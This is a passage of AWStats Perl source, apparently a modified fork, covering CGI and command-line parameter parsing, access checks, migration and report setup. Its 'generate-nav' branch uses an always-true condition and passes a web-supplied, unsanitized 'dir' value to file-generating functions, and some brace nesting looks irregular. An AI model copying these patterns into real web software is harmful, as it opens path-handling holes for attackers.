		if ( $ARGV[$_] =~ /(^|-|&|&amp;)migrate=([^&]+)/i ) {
			$MigrateStats = &Sanitize("$2");

			$MigrateStats =~ /^(.*)$PROG(\d{0,2})(\d\d)(\d\d\d\d)(.*)\.txt$/;
			$SiteConfig = &Sanitize($5 ? $5 : 'xxx');
			$SiteConfig =~ s/^\.//;    # SiteConfig is used to find config file
			next;
		}

		# TODO Check if ARGV is in @AllowedArg
		if ($QueryString) { $QueryString .= '&amp;'; }
		my $NewLinkParams = $ARGV[$_];
		$NewLinkParams =~ s/^-+//;
		$QueryString .= "$NewLinkParams";
	}

	# Remove all XSS vulnerabilities coming from AWStats parameters
	$QueryString = CleanXSS($QueryString);

	# Security test
	if (   $ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'}
		&& $QueryString =~ /LogFile=([^&]+)/i )
	{
		error( "Logfile parameter can't be overwritten when AWStats is used from a CGI" );
	}

	# Update with no report by default when run from command line
	$UpdateStats = 1;

	if ( $QueryString =~ /config=([^&]+)/i ) { 
		$SiteConfig = &Sanitize("$1"); 
	}
	if ( $QueryString =~ /diricons=([^&]+)/i ) { $DirIcons = "$1"; }
	if ( $QueryString =~ /pluginmode=([^&]+)/i ) {
		$PluginMode = &Sanitize( "$1", 1 );
	}
	if ( $QueryString =~ /configdir=([^&]+)/i ) {
		$DirConfig = &Sanitize("$1");
		$DirConfig =~ s/\\{2,}/\\/g;	# This is to clean Remote URL
		$DirConfig =~ s/\/{2,}/\//g;	# This is to clean Remote URL
	}

	# All filters
	if ( $QueryString =~ /hostfilter=([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	}    # Filter on host list can also be defined with hostfilter=filter
	if ( $QueryString =~ /hostfilterex=([^&]+)/i ) {
		$FilterEx{'host'} = "$1";
	}    #
	if ( $QueryString =~ /urlfilter=([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	}    # Filter on URL list can also be defined with urlfilter=filter
	if ( $QueryString =~ /urlfilterex=([^&]+)/i ) { $FilterEx{'url'} = "$1"; } #
	if ( $QueryString =~ /refererpagesfilter=([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} # Filter on referer list can also be defined with refererpagesfilter=filter
	if ( $QueryString =~ /refererpagesfilterex=([^&]+)/i ) {
		$FilterEx{'refererpages'} = "$1";
	}    #
		 # All output
	if ( $QueryString =~ /output=allhosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} # Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=lasthosts:([^&]+)/i ) {
		$FilterIn{'host'} = "$1";
	} # Filter on host list can be defined with output=lasthosts:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=urldetail:([^&]+)/i ) {
		$FilterIn{'url'} = "$1";
	} # Filter on URL list can be defined with output=urldetail:filter to reduce number of lines read and showed
	if ( $QueryString =~ /output=refererpages:([^&]+)/i ) {
		$FilterIn{'refererpages'} = "$1";
	} # Filter on referer list can be defined with output=refererpages:filter to reduce number of lines read and showed
	  # Config parameters
	if ( $QueryString =~ /LogFile=([^&]+)/i ) { $LogFile = "$1"; }

	# If show options
	if ( $QueryString =~ /showsteps/i ) {
		$ShowSteps = 1;
		$QueryString =~ s/showsteps[^&]*//i;
	}
	if ( $QueryString =~ /showcorrupted/i ) {
		$ShowCorrupted = 1;
		$QueryString =~ s/showcorrupted[^&]*//i;
	}
	if ( $QueryString =~ /showdropped/i ) {
		$ShowDropped = 1;
		$QueryString =~ s/showdropped[^&]*//i;
	}
	if ( $QueryString =~ /showunknownorigin/i ) {
		$ShowUnknownOrigin = 1;
		$QueryString =~ s/showunknownorigin[^&]*//i;
	}
	if ( $QueryString =~ /showdirectorigin/i ) {
		$ShowDirectOrigin = 1;
		$QueryString =~ s/showdirectorigin[^&]*//i;
	}
	
	$SiteConfig =~ s/\.\.//g; 
	}

	if ( $QueryString =~ /(^|&|&amp;)staticlinks/i ) { $StaticLinks = "$PROG.$SiteConfig"; }
	if ( $QueryString =~ /(^|&|&amp;)staticlinks=([^&]+)/i ) { $StaticLinks = "$2"; }    # When ran from awstatsbuildstaticpages.pl
	if ( $QueryString =~ /(^|&|&amp;)staticlinksext=([^&]+)/i ) { $StaticExt = "$2"; }
	if ( $QueryString =~ /(^|&|&amp;)framename=([^&]+)/i ) { $FrameName = "$2"; }
	if ( $QueryString =~ /(^|&|&amp;)debug=(\d+)/i )       { $Debug     = $2; }
	if ( $QueryString =~ /(^|&|&amp;)databasebreak=(\w+)/i ) { $DatabaseBreak = $2; }
	if ( $QueryString =~ /(^|&|&amp;)updatefor=(\d+)/i ) { $UpdateFor = $2; }

	if ( $QueryString =~ /(^|&|&amp;)noloadplugin=([^&]+)/i ) { foreach ( split( /,/, $2 ) ) { $NoLoadPlugin{ &Sanitize( "$_", 1 ) } = 1; } }
	if ( $QueryString =~ /(^|&|&amp;)limitflush=(\d+)/i ) { $LIMITFLUSH = $2; }
	if ( $QueryString =~ /(^|&|&amp;)nboflastupdatelookuptosave=(\d+)/i ) { $NBOFLASTUPDATELOOKUPTOSAVE = $2; }

	# Get/Define output
	if ( $QueryString =~ /(^|&|&amp;)output(=[^&]*|)(.*)(&|&amp;)output(=[^&]*|)(&|$)/i ) { error( "Only 1 output option is allowed", "", "", 1 ); }
	if ( $QueryString =~ /(^|&|&amp;)output(=[^&]*|)(&|$)/i ) {

		# At least one output expected. We define %HTMLOutput
		my $outputlist = "$2";
		if ($outputlist) {
			$outputlist =~ s/^=//;
			foreach my $outputparam ( split( /,/, $outputlist ) ) {
				$outputparam =~ s/:(.*)$//;
				if ($outputparam) { $HTMLOutput{ lc($outputparam) } = "$1" || 1; }
			}
		}

		# If on command line and no update
		if ( !$ENV{'GATEWAY_INTERFACE'} && $QueryString !~ /update/i ) {
			$UpdateStats = 0;
		}

		# If no output defined, used default value
		if ( !scalar keys %HTMLOutput ) { $HTMLOutput{'main'} = 1; }
	}
	if ( $ENV{'GATEWAY_INTERFACE'} && !scalar keys %HTMLOutput ) {
		$HTMLOutput{'main'} = 1;
	}

	# Remove -output option with no = from QueryString
	$QueryString =~ s/(^|&|&amp;)output(&|$)/$1$2/i;
	$QueryString =~ s/&+$//;

	# Check year, month, day, hour parameters
	if ( $QueryString =~ /(^|&|&amp;)month=(year)/i ) {
		error("month=year is a deprecated option. Use month=all instead.");
	}
	if ( $QueryString =~ /(^|&|&amp;)year=(\d\d\d\d)/i ) {
		$YearRequired = sprintf( "%04d", $2 );
	}
	else { $YearRequired = "$nowyear"; }
	if ( $QueryString =~ /(^|&|&amp;)month=(\d{1,2})/i ) {
		$MonthRequired = sprintf( "%02d", $2 );
	}
	elsif ( $QueryString =~ /(^|&|&amp;)month=(all)/i ) { $MonthRequired = 'all'; }
	else { $MonthRequired = "$nowmonth"; }
	if ( $QueryString =~ /(^|&|&amp;)day=(\d{1,2})/i ) {
		$DayRequired = sprintf( "%02d", $2 );
	} # day is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.
	else { $DayRequired = ''; }
	if ( $QueryString =~ /(^|&|&amp;)hour=(\d{1,2})/i ) {
		$HourRequired = sprintf( "%02d", $2 );
	} # hour is a hidden option. Must not be used (Make results not understandable). Available for users that rename history files with day.
	else { $HourRequired = ''; }

	# Check parameter validity
	# TODO

	# Print AWStats and Perl version
	if ($Debug) {
		debug( ucfirst($PROG) . " - $VERSION - Perl $^X $]", 1 );
		debug( "DIR=$DIR PROG=$PROG Extension=$Extension",   2 );
		debug( "QUERY_STRING=$QueryString",                  2 );
		debug( "HTMLOutput=" . join( ',', keys %HTMLOutput ), 1 );
		debug( "YearRequired=$YearRequired, MonthRequired=$MonthRequired", 2 );
		debug( "DayRequired=$DayRequired, HourRequired=$HourRequired",     2 );
		debug( "UpdateFor=$UpdateFor",                                     2 );
		debug( "PluginMode=$PluginMode",                                   2 );
		debug( "DirConfig=$DirConfig",                                     2 );
	}

	# Force SiteConfig if AWSTATS_FORCE_CONFIG is defined
	if ( $ENV{'AWSTATS_CONFIG'} ) {
		$ENV{'AWSTATS_FORCE_CONFIG'} = $ENV{'AWSTATS_CONFIG'};
	}    # For backward compatibility
	if ( $ENV{'AWSTATS_FORCE_CONFIG'} ) {
		if ($Debug) {
			debug(  "AWSTATS_FORCE_CONFIG parameter is defined to '"
				. $ENV{'AWSTATS_FORCE_CONFIG'}
				. "'. $PROG will use this as config value." );
		}
		$SiteConfig = &Sanitize( $ENV{'AWSTATS_FORCE_CONFIG'} );
	}

	# Display version information
	if ( $QueryString =~ /(^|&|&amp;)(version|v)(&|$)/i ) {
		print "$PROG $VERSION\n";
		exit 0;
	}
	# Display help information
	if ( ( !$ENV{'GATEWAY_INTERFACE'} ) && ( !$SiteConfig ) ) {
		&print_help();
		exit 2;
	}

	$SiteConfig ||= &Sanitize( $ENV{'SERVER_NAME'} );

	#$ENV{'SERVER_NAME'}||=$SiteConfig;	# For thoose who use __SERVER_NAME__ in conf file and use CLI.
	$ENV{'AWSTATS_CURRENT_CONFIG'} = $SiteConfig;

	# Read config file (SiteConfig must be defined)
	&Read_Config($DirConfig);

	if ($QueryString =~ /doc=([\w-]+)/) {
		my $doc = $1;
		&Read_Language_Data($Lang);
		http_head();
		html_head();
		print "<div class='document-container'>\n";
		
		if ($doc eq 'changelog') {
			&generate_changelog_doc();
		}
		elsif ($doc eq 'what') {
			&generate_what_doc();
		}
		elsif ($doc eq 'license') {
			&generate_license_doc();
		}
		elsif ($doc eq 'glossary') {
			&generate_glossary_doc();
		}
		elsif ($doc eq 'setup') {
			&generate_setup_doc();
		}
		elsif ($doc eq 'upgrade') {
			&generate_upgrade_doc();
		}
		elsif ($doc eq 'config') {
			&generate_config_doc();
		}
		elsif ($doc eq 'extra') {
			&generate_extra_doc();
		}
		elsif ($doc eq 'tools') {
			&generate_tools_doc();
		}
		elsif ($doc eq 'faq') {
			&generate_faq_doc();
		}
		elsif ($doc eq 'security') {
			&generate_security_doc();
		}
		elsif ($doc eq 'compare') {
			&generate_compare_doc();
		}
		elsif ($doc eq 'benchmark') {
			&generate_benchmark_doc();
		}
		elsif ($doc eq 'webmin') {
			&generate_webmin_doc();
		}
		elsif ($doc eq 'dolibarr') {
			&generate_dolibarr_doc();
		}
		elsif ($doc eq 'contrib') {
			&generate_contrib_doc();
		}
		elsif ($doc eq 'dev_plugins') {
			&generate_devplugins_doc();
		}
		elsif ($doc eq 'dev_hooks') {
			&generate_devhooks_doc();
		}
		elsif ($doc eq 'dev_graphs') {
			&generate_devgraphs_doc();
		}

		print "</div>\n";
		html_end();
		exit 0;
	}
	# Check language
	if ( $QueryString =~ /(^|&|&amp;)lang=([^&]+)/i ) { $Lang = "$2"; }
	# If lang not defined or forced to auto
	if ( !$Lang || $Lang eq 'auto' ) {
		my $langlist = $ENV{'HTTP_ACCEPT_LANGUAGE'} || '';
		$langlist =~ s/;[^,]*//g;
		if ($Debug) {
			debug(
				"Search an available language among HTTP_ACCEPT_LANGUAGE=$langlist",
				1
			);
		}
		foreach my $code ( split( /,/, $langlist ) )
		# Search for a valid lang in priority
		{
			if ( $LangBrowserToLangAwstats{$code} ) {
				$Lang = $LangBrowserToLangAwstats{$code};
				if ($Debug) { debug( " Will try to use Lang=$Lang", 1 ); }
				last;
			}
			$code =~ s/-.*$//;
			if ( $LangBrowserToLangAwstats{$code} ) {
				$Lang = $LangBrowserToLangAwstats{$code};
				if ($Debug) { debug( " Will try to use Lang=$Lang", 1 ); }
				last;
			}
		}
	}
	if ( !$Lang || $Lang eq 'auto' ) {
		if ($Debug) {
			debug( " No language defined or available. Will use Lang=en", 1 );
		}
		$Lang = 'en-us';
	}

	# Check and correct bad parameters
	&Check_Config();

	# Now SiteDomain is defined

	if ( $Debug && !$DebugMessages ) {
		error( "Debug has not been allowed. Change DebugMessages parameter in config file to allow debug."
		);
	}

	# Define frame name and correct variable for frames
	if ( !$FrameName ) {
		if (   $ENV{'GATEWAY_INTERFACE'}
			&& $UseFramesWhenCGI
			&& $HTMLOutput{'main'}
			&& !$PluginMode )
		{
			$FrameName = 'index';
		}
		else { $FrameName = 'main'; }
	}

	# Load Message files, Reference data files and Plugins
	if ($Debug) { debug( "FrameName=$FrameName", 1 ); }
	if ( $FrameName ne 'index' ) {
	&Read_Language_Data($Lang);

	if ( ($ENV{'GATEWAY_INTERFACE'} || !$ENV{'GATEWAY_INTERFACE'}) && 
		$QueryString =~ /(^|&|&amp;|^)generate-nav/i ) {
		
		my $dir = '';
		my @months = ();
		
		# 从 QueryString 或命令行参数获取
		if ( $QueryString =~ /dir=([^&]+)/i ) {
			$dir = $1;
		} else {
			# 尝试从命令行参数获取
			for my $i (0 .. $#ARGV) {
				if ($ARGV[$i] =~ /dir=(.+)/) {
					$dir = $1;
					last;
				}
			}
		}
		
		if ( $QueryString =~ /months=([^&]+)/i ) {
			@months = split(' ', $1);
		} else {
			for my $i (0 .. $#ARGV) {
				if ($ARGV[$i] =~ /months=(.+)/) {
					@months = split(' ', $1);
					last;
				}
			}
		}
		
		# 获取当前月份
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$year += 1900;
		$mon += 1;
		my $current_month = sprintf("%04d-%02d", $year, $mon);
		
		generate_what_doc($dir);
		generate_changelog_doc($dir);
		generate_benchmark_doc($dir);
		generate_compare_doc($dir);
		generate_config_doc($dir);
		generate_contrib_doc($dir);
		generate_devgraphs_doc($dir);
		generate_devhooks_doc($dir);
		generate_devplugins_doc($dir);
		generate_dolibarr_doc($dir);
		generate_extra_doc($dir);
		generate_faq_doc($dir);
		generate_glossary_doc($dir);
		generate_license_doc($dir);
		generate_loganalysispaper_doc($dir);
		generate_security_doc($dir);
		generate_setup_doc($dir);
		generate_tools_doc($dir);
		generate_upgrade_doc($dir);
		generate_webmin_doc($dir);
		generate_home_doc($dir);
		exit 0;
	}

	if ( $FrameName ne 'mainleft' ) {
		my %datatoload = ();
		my ( $filedomains, $filemime, $filerobots, $fileworms, $filebrowser, $fileos,   $filese )
		  = ( 'domains',  'mime', 'robots',   'worms', 'browsers', 'operating_systems', 'search_engines' );
		my ( $filestatushttp, $filestatussmtp ) =
		  ( 'status_http', 'status_smtp' );
		if ( $LevelForBrowsersDetection eq 'allphones' ) { $filebrowser = 'browsers_phone'; }
		# If update or output
		if ($UpdateStats) {
			if ($LevelForFileTypesDetection) { $datatoload{$filemime} = 1; } # Only if need to filter on known extensions
			if ($LevelForRobotsDetection) { $datatoload{$filerobots} = 1; } # ua
			if ($LevelForWormsDetection) { $datatoload{$fileworms} = 1; } # url
			if ($LevelForBrowsersDetection) { $datatoload{$filebrowser} = 1; } # ua
			if ($LevelForOSDetection) { $datatoload{$fileos} = 1; } # ua
			if ($LevelForRefererAnalyze) { $datatoload{$filese} = 1; } # referer
		}
		# If output
		if ( scalar keys %HTMLOutput ) {
			if ( $ShowDomainsStats || $ShowHostsStats ) { $datatoload{$filedomains} = 1; } 
			# TODO Replace by test if ($ShowDomainsStats) when plugins geoip can force load of domains datafile.
			if ($ShowFileTypesStats)  { $datatoload{$filemime}       = 1; }
			if ($ShowRobotsStats)     { $datatoload{$filerobots}     = 1; }
			if ($ShowWormsStats)      { $datatoload{$fileworms}      = 1; }
			if ($ShowBrowsersStats)   { $datatoload{$filebrowser}    = 1; }
			if ($ShowOSStats)         { $datatoload{$fileos}         = 1; }
			if ($ShowOriginStats)     { $datatoload{$filese}         = 1; }
			if ($ShowHTTPErrorsStats) { $datatoload{$filestatushttp} = 1; }
			if ($ShowSMTPErrorsStats) { $datatoload{$filestatussmtp} = 1; }
		}
		&Read_Ref_Data( keys %datatoload );
	}
	&Read_Plugins();
	}

	# Here charset is defined, so we can send the http header (Need BuildReportFormat,PageCode)
	# Run from a browser as CGI
	if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {
		http_head();
	}

	# Init other parameters
	$NBOFLINESFORBENCHMARK--;
	if ( $ENV{'GATEWAY_INTERFACE'} ) { $DirCgi = ''; }
	if ( $DirCgi && !( $DirCgi =~ /\/$/ ) && !( $DirCgi =~ /\\$/ ) ) {
		$DirCgi .= '/';
	}
	if ( !$DirData || $DirData =~ /^\./ ) {
		if ( !$DirData || $DirData eq '.' ) {
			$DirData = "$DIR";
		}    # If not defined or chosen to '.' value then DirData is current dir
		elsif ( $DIR && $DIR ne '.' ) { $DirData = "$DIR/$DirData"; }
	}
	$DirData ||= '.';    # If current dir not defined then we put it to '.'
	$DirData =~ s/[\\\/]+$//;

	if ( $FirstDayOfWeek == 1 ) { @DOWIndex = ( 1, 2, 3, 4, 5, 6, 0 ); }
	else { @DOWIndex = ( 0, 1, 2, 3, 4, 5, 6 ); }

	# Should we link to ourselves or to a wrapper script
	$AWScript = ( $WrapperScript ? "$WrapperScript" : "$DirCgi$PROG.$Extension" );
	if (index($AWScript,'?')>-1) 
	{
		$AWScript .= '&amp;';   # $AWScript contains URL parameters
	}
	else 
	{
		$AWScript .= '?';
	}


	# Print html header (Need HTMLOutput,Expires,Lang,StyleSheet,HTMLHeadSectionExpires defined by Read_Config, PageCode defined by Read_Language_Data)
	if ( !$HeaderHTMLSent ) { &html_head; }

	# AWStats output is replaced by a plugin output
	if ($PluginMode) {

		#	my $function="BuildFullHTMLOutput_$PluginMode()";
		#	eval("$function");
		my $function = "BuildFullHTMLOutput_$PluginMode";
		&$function();
		if ( $? || $@ ) { error("$@"); }
		&html_end(0);
		exit 0;
	}

	# Security check
	if ( $AllowAccessFromWebToAuthenticatedUsersOnly && $ENV{'GATEWAY_INTERFACE'} )
	{
	if ($Debug) { debug( "REMOTE_USER=" . $ENV{"REMOTE_USER"} ); }
	if ( !$ENV{"REMOTE_USER"} ) {
		error( "Access to statistics is only allowed from an authenticated session to authenticated users."
		);
	}
	if (@AllowAccessFromWebToFollowingAuthenticatedUsers) {
		my $userisinlist = 0;
		my $remoteuser   = quotemeta( $ENV{"REMOTE_USER"} );
		$remoteuser =~ s/\s/%20/g
		  ; # Allow authenticated user with space in name to be compared to allowed user list
		my $currentuser = qr/^$remoteuser$/i;    # Set precompiled regex
		foreach (@AllowAccessFromWebToFollowingAuthenticatedUsers) {
			if (/$currentuser/o) { $userisinlist = 1; last; }
		}
		if ( !$userisinlist ) {
			error(  "User '"
				  . $ENV{"REMOTE_USER"}
				  . "' is not allowed to access statistics of this domain/config."
			);
		}
	}
	}
	if ( $AllowAccessFromWebToFollowingIPAddresses && $ENV{'GATEWAY_INTERFACE'} ) {
	my $IPAddress     = $ENV{"REMOTE_ADDR"};                  # IPv4 or IPv6
	my $useripaddress = &Convert_IP_To_Decimal($IPAddress);
	my @allowaccessfromipaddresses =
	  split( /[\s,]+/, $AllowAccessFromWebToFollowingIPAddresses );
	my $allowaccess = 0;
	foreach my $ipaddressrange (@allowaccessfromipaddresses) {
		if ( $ipaddressrange !~
			/^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/
			&& $ipaddressrange !~
			/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
		{
			error( "AllowAccessFromWebToFollowingIPAddresses is defined to '$AllowAccessFromWebToFollowingIPAddresses' but part of value does not match the correct syntax: IPv4AddressMin[-IPv4AddressMax] or IPv6Address[\/prefix] in \"$ipaddressrange\""
			);
		}

		# Test ip v4
		if ( $ipaddressrange =~
			/^(\d+\.\d+\.\d+\.\d+)(?:-(\d+\.\d+\.\d+\.\d+))*$/ )
		{
			my $ipmin = &Convert_IP_To_Decimal($1);
			my $ipmax = $2 ? &Convert_IP_To_Decimal($2) : $ipmin;

			# Is it an authorized ip ?
			if ( ( $useripaddress >= $ipmin ) && ( $useripaddress <= $ipmax ) )
			{
				$allowaccess = 1;
				last;
			}
		}

		# Test ip v6
		if ( $ipaddressrange =~
			/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\/\d)/ )
		{
			if ( $ipaddressrange =~ /::\// ) {
				my @IPv6split = split( /::/, $ipaddressrange );
				if ( $IPAddress =~ /^$IPv6split[0]/ ) {
					$allowaccess = 1;
					last;
				}
			}
			elsif ( $ipaddressrange == $IPAddress ) {
				$allowaccess = 1;
				last;
			}
		}
			}
			if ( !$allowaccess ) {
				error( "Access to statistics is not allowed from your IP Address "
					. $ENV{"REMOTE_ADDR"} );
			}
		}
		if (   ( $UpdateStats || $MigrateStats )
			&& ( !$AllowToUpdateStatsFromBrowser )
			&& $ENV{'GATEWAY_INTERFACE'} )
		{
			error(  ""
				. ( $UpdateStats ? "Update" : "Migrate" )
				. " of statistics has not been allowed from a browser (AllowToUpdateStatsFromBrowser should be set to 1)."
			);
		}
		if ( scalar keys %HTMLOutput && $MonthRequired eq 'all' ) {
			if ( !$AllowFullYearView ) {
				error( "Full year view has not been allowed (AllowFullYearView is set to 0)."
				);
			}
			if ( $AllowFullYearView < 3 && $ENV{'GATEWAY_INTERFACE'} ) {
				error( "Full year view has not been allowed from a browser (AllowFullYearView should be set to 3)."
				);
			}
}

#------------------------------------------
# MIGRATE PROCESS (Must be after reading config cause we need MaxNbOf... and Min...)
#------------------------------------------
if ($MigrateStats) {
	if ($Debug) { debug( "MigrateStats is $MigrateStats", 2 ); }
	if ( $MigrateStats !~
		/^(.*)$PROG(\d\d)(\d\d\d\d)(\d{0,2})(\d{0,2})(.*)\.txt$/ )
	{
		error( "AWStats history file name must match following syntax: ${PROG}MMYYYY[.config].txt",
			"", "", 1
		);
	}
	$DirData       = "$1";
	$MonthRequired = "$2";
	$YearRequired  = "$3";
	$DayRequired   = "$4";
	$HourRequired  = "$5";
	$FileSuffix    = "$6";

	# Correct DirData
	if ( !$DirData || $DirData =~ /^\./ ) {
		if ( !$DirData || $DirData eq '.' ) {
			$DirData = "$DIR";
		}    # If not defined or chosen to '.' value then DirData is current dir
		elsif ( $DIR && $DIR ne '.' ) { $DirData = "$DIR/$DirData"; }
	}
	$DirData ||= '.';    # If current dir not defined then we put it to '.'
	$DirData =~ s/[\\\/]+$//;
	print "Start migration for file '$MigrateStats'.";
	print $ENV{'GATEWAY_INTERFACE'} ? "<br>" : "\n";
	if ($EnableLockForUpdate) { &Lock_Update(1); }
	my $newhistory =
	  &Read_History_With_TmpUpdate( $YearRequired, $MonthRequired, $DayRequired,
		$HourRequired, 1, 0, 'all' );
	if ( rename( "$newhistory", "$MigrateStats" ) == 0 ) {
		unlink "$newhistory";
		error( "Failed to rename \"$newhistory\" into \"$MigrateStats\".\nWrite permissions on \"$MigrateStats\" might be wrong"
			  . (
				$ENV{'GATEWAY_INTERFACE'} ? " for a 'migration from web'" : ""
			  )
			  . " or file might be opened."
		);
	}
	if ($EnableLockForUpdate) { &Lock_Update(0); }
	print "Migration for file '$MigrateStats' successful.";
	print $ENV{'GATEWAY_INTERFACE'} ? "<br>" : "\n";
	&html_end(1);
	exit 0;
}

# Output main frame page and exit. This must be after the security check.
if ( $FrameName eq 'index' ) {
	&Read_Language_Data($Lang);
	
	# Define the NewLinkParams for main chart
	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }

	# 发送 HTTP 头
	if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {http_head();}
	my $lang_dir = $PageDir ? 'rtl' : 'ltr';

	if ($StyleSheet) {
		print "<link rel=\"stylesheet\" href=\"$StyleSheet\">";
	} else {
		print get_modern_css($lang_dir);
	}
	
	# 翻译文本
	my $title = _t("Invalid URL Parameters");
	my $msg1 = _t("The requested page cannot be loaded due to invalid or malformed URL parameters.");
	my $msg2 = _t("This may be caused by typing an incorrect URL, missing parameter separators, or using an invalid configuration name.");
	my $msg3 = _t("Please check the URL you entered and ensure all parameters are correctly formatted.");
	my $btn_text = _t("View Report Directly");
	
	print "<div class=\"aws-container\">";
	print "<div style=\"text-align: center; padding: 60px 20px; max-width: 600px; margin: 0 auto;\">";
	print "<div class=\"aws-border\" style=\"padding: 50px 40px;\">";
	
	# 404 大号数字
	print "<div style=\"font-size: 100px; font-weight: bold; line-height: 1; margin-bottom: 20px;\">";
	print "<span style=\"color: var(--error-color);\">4</span>\n";
	print "<span style=\"color: var(--warning-color);\">0</span>\n";
	print "<span style=\"color: var(--error-color);\">4</span>\n";
	print "</div>\n";
	
	# 标题
	print "<h2 style=\"color: var(--text-color); margin-bottom: 20px;\">$title</h2>\n";
	
	# 错误说明
	print "<div style=\"text-align: left; margin: 30px 0;\">";
	print "<p style=\"margin: 15px 0; line-height: 1.6;\">$msg1</p>\n";
	print "<p style=\"margin: 15px 0; line-height: 1.6;\">$msg2</p>\n";
	print "<p style=\"margin: 15px 0; line-height: 1.6;\">$msg3</p>\n";
	print "</div>\n";
	
	print "<hr style=\"margin: 30px 0; border-color: var(--border-color);\">";
	
	# 解决方案按钮
	print "<div>";
	print "<a href=\"" . XMLEncode("$AWScript${NewLinkParams}framename=mainright") . "\" class=\"aws-button\" style=\"display: inline-block; padding: 12px 28px; font-size: 16px;\">";
	print "$btn_text";
	print "</a>";
	print "</div>\n";
	
	print "</div>\n";
	print "</div>\n";
	print "</div>\n";
	print get_theme_script();
	print "</body>\n";
	&html_end();
	exit 0;
}

%MonthNumLib = (
	"01", _t("month_01"), "02", _t("month_02"), "03", _t("month_03"),
	"04", _t("month_04"), "05", _t("month_05"), "06", _t("month_06"),
	"07", _t("month_07"), "08", _t("month_08"), "09", _t("month_09"),
	"10", _t("month_10"), "11", _t("month_11"), "12", _t("month_12")
);

# Build ListOfYears list with all existing years
($lastyearbeforeupdate, $lastmonthbeforeupdate, $lastdaybeforeupdate, $lasthourbeforeupdate, $lastdatebeforeupdate) = (0) x 5;
my $datemask = '';
if    ( $DatabaseBreak eq 'month' ) { $datemask = '(\d\d)(\d\d\d\d)'; }
elsif ( $DatabaseBreak eq 'year' )  { $datemask = '(\d\d\d\d)'; }
elsif ( $DatabaseBreak eq 'day' )   { $datemask = '(\d\d)(\d\d\d\d)(\d\d)'; }
elsif ( $DatabaseBreak eq 'hour' )  { $datemask = '(\d\d)(\d\d\d\d)(\d\d)(\d\d)'; }

if ($Debug) {
	debug( "Scan for last history files into DirData='$DirData' with mask='$datemask'"
	);
}

my $retval = opendir( DIR, "$DirData" );
if(! $retval) {
	my $err = $!;
	&Read_Language_Data($Lang);
	my $error_msg = _t("This directory lacks read permission") . " $DirData : $err";
	my $perm_cmd = '';
	if ($^O =~ /win/i) {
		$perm_cmd = _t("Please run as Administrator to set permissions") . ":\n"
				. "icacls.exe \"$DirData\" /grant \"SYSTEM:(OI)(CI)F\" /grant \"Administrators:(OI)(CI)F\" /grant \"IIS_IUSRS:(OI)(CI)RX\"";
	} else {
		$perm_cmd = _t("Please set read permission for directory") . ":\n"
				. "chmod 755 $DirData";
	}
	
	error("$error_msg\n\n$perm_cmd");
}

my $regfilesuffix = quotemeta($FileSuffix);
foreach ( grep /^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i, file_filt(sort readdir DIR) )
{ /^$PROG$datemask$regfilesuffix\.txt(|\.gz)$/i;
	if ( !$ListOfYears{"$2"} || "$1" gt $ListOfYears{"$2"} ) { $ListOfYears{"$2"} = "$1"; }
	my $rangestring = ( $2 || "" ) . ( $1 || "" ) . ( $3 || "" ) . ( $4 || "" );
	if ( $rangestring gt $lastdatebeforeupdate ) {
		$lastyearbeforeupdate  = ( $2 || "" );
		$lastmonthbeforeupdate = ( $1 || "" );
		$lastdaybeforeupdate   = ( $3 || "" );
		$lasthourbeforeupdate  = ( $4 || "" );
		$lastdatebeforeupdate = $rangestring;
	}
}
close DIR;

# If at least one file found, get value for LastLine
if ($lastyearbeforeupdate) {

	# Read 'general' section of last history file for LastLine
	&Read_History_With_TmpUpdate( $lastyearbeforeupdate, $lastmonthbeforeupdate,
		$lastdaybeforeupdate, $lasthourbeforeupdate, 0, 0, "general" );
}

# Warning if lastline in future
if ( $LastLine > ( $nowtime + 20000 ) ) {
	warning( "WARNING: LastLine parameter in history file is '$LastLine' so in future. May be you need to correct manually the line LastLine in some awstats*.$SiteConfig.conf files."
	);
}

# Force LastLine
if ( $QueryString =~ /lastline=(\d{14})/i ) {
	$LastLine = $1;
}
if ($Debug) {
	debug("Last year=$lastyearbeforeupdate - Last month=$lastmonthbeforeupdate");
	debug("Last day=$lastdaybeforeupdate - Last hour=$lasthourbeforeupdate");
	debug("LastLine=$LastLine");
	debug("LastLineNumber=$LastLineNumber");
	debug("LastLineOffset=$LastLineOffset");
	debug("LastLineChecksum=$LastLineChecksum");
}
#------------------------------------------
# UPDATE PROCESS
#------------------------------------------
my $lastlinenb         = 0;
my $lastlineoffset     = 0;
my $lastlineoffsetnext = 0;
if ($Debug) { debug( "UpdateStats is $UpdateStats", 2 ); }
if ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )
# Update only on index page or when not framed to avoid update twice
# MonthNum must be in english because used to translate log date in apache log files
{
	my %MonthNum = (
		"Jan", "01", "jan", "01", "Feb", "02", "feb", "02", "Mar", "03",
		"mar", "03", "Apr", "04", "apr", "04", "May", "05", "may", "05",
		"Jun", "06", "jun", "06", "Jul", "07", "jul", "07", "Aug", "08",
		"aug", "08", "Sep", "09", "sep", "09", "Oct", "10", "oct", "10",
		"Nov", "11", "nov", "11", "Dec", "12", "dec", "12"
	  );

	if ( !scalar keys %HTMLOutput ) {
		print "Create/Update database for config \"$FileConfig\" by AWStats version $VERSION\n";
		print "From data in log file \"$LogFile\"...\n";
	}
